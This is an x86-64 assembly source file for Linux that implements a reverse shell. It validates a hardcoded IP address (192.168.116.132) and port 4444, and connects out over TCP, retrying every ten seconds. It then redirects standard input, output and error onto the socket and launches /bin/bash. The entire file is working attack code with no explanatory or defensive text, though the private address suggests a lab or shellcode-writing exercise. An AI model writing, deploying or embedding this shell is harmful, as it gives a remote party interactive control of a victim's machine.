section .data
    command db '/bin/bash', 0
    ip_str db '192.168.116.132', 0
    port_str db '4444', 0
    
    err_ip_format db 'Error: Invalid IP format', 10, 0
    err_wrong_port db 'Error: Port must be 4444', 10, 0
    err_socket db 'Error: Socket creation failed', 10, 0

section .bss
    ip_bytes resd 1
    port_bytes resw 1

section .text
    global _start

_start:
    call validate_and_parse_ip
    test rax, rax
    jz ip_format_error
    

    call validate_port
    test rax, rax
    jz port_error
    
    jmp connect

validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push rcx
    push rdx
    push r9
    
    lea rsi, [ip_str]       
    lea rdi, [ip_bytes]     
    xor rbx, rbx           
    xor rax, rax           
    xor rcx, rcx           
    xor r9, r9              
    
parse_ip_loop:
    movzx rdx, byte [rsi + rcx]  
    test rdx, rdx                
    jz validate_last_octet
    
    cmp rdx, '.'                 
    je store_octet
    
    cmp rdx, '0'
    jb ip_invalid
    cmp rdx, '9'
    ja ip_invalid
    
    sub rdx, '0'
    imul rax, 10
    add rax, rdx
    
    cmp rax, 255
    ja ip_invalid
    
    inc rcx
    jmp parse_ip_loop

store_octet:
    cmp rbx, 3               
    jae ip_invalid
    
    shl r9, 8
    or r9, rax
    
    inc rbx
    xor rax, rax           
    inc rcx
    jmp parse_ip_loop

validate_last_octet:
    cmp rbx, 3              
    jne ip_invalid
    
    shl r9, 8
    or r9, rax
    
    mov eax, r9d
    bswap eax
    mov dword [ip_bytes], eax
    
    mov rax, 1               
    jmp ip_parse_done

ip_invalid:
    xor rax, rax

ip_parse_done:
    pop r9
    pop rdx
    pop rcx
    pop rbx
    pop rbp
    ret

validate_port:
    push rbp
    mov rbp, rsp
    push rsi
    
    lea rsi, [port_str]
    
    ; Check "4444"
    cmp byte [rsi], '4'
    jne port_invalid
    cmp byte [rsi+1], '4'
    jne port_invalid
    cmp byte [rsi+2], '4'
    jne port_invalid
    cmp byte [rsi+3], '4'
    jne port_invalid
    cmp byte [rsi+4], 0
    jne port_invalid
    
    ; Store port in network byte order (4444 = 0x115c)
    mov word [port_bytes], 0x5c11
    mov rax, 1
    jmp port_valid_done

port_invalid:
    xor rax, rax

port_valid_done:
    pop rsi
    pop rbp
    ret

connect:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41
    mov rdi, 2         
    mov rsi, 1          
    mov rdx, 0
    syscall 
    
    test rax, rax
    js socket_error
    mov r8, rax         
    
   
    sub rsp, 16        
    mov word [rsp], 2   
    mov ax, [port_bytes]
    mov word [rsp+2], ax 
    mov eax, [ip_bytes]
    mov dword [rsp+4], eax 
    mov qword [rsp+8], 0  
    
    ; connect(socket, sockaddr, 16)
    mov rdi, r8        
    mov rsi, rsp       
    mov rdx, 16         
    mov rax, 42         
    syscall
    
    add rsp, 16         
    
    test rax, rax
    js wait_and_retry
    
    xor rsi, rsi
    jmp dup2_loop

wait_and_retry:
    sub rsp, 16
    mov qword [rsp], 10     
    mov qword [rsp+8], 0   
    
    mov rax, 35         
    mov rdi, rsp
    xor rsi, rsi
    syscall
    
    add rsp, 16
    jmp connect

dup2_loop:
    ; dup2(client_fd, new_fd)
    mov rax, 33         
    mov rdi, r8         
    ; rsi contains target fd (0, 1, 2)
    syscall
    
    test rax, rax
    js exit_with_error
    
    inc rsi
    cmp rsi, 3
    jne dup2_loop
    
    ; execve("/bin/bash", NULL, NULL)
    mov rax, 59         
    lea rdi, [command]
    xor rsi, rsi        
    xor rdx, rdx        
    syscall
    
    jmp exit_with_error

ip_format_error:
    mov rax, 1          
    mov rdi, 2          
    lea rsi, [err_ip_format]
    mov rdx, 26
    syscall
    jmp exit_with_error

port_error:
    mov rax, 1         
    mov rdi, 2          
    lea rsi, [err_wrong_port]
    mov rdx, 23
    syscall
    jmp exit_with_error

socket_error:
    mov rax, 1          
    mov rdi, 2         
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    jmp exit_with_error

exit_with_error:
    mov rax, 60         
    mov rdi, 1         
    syscall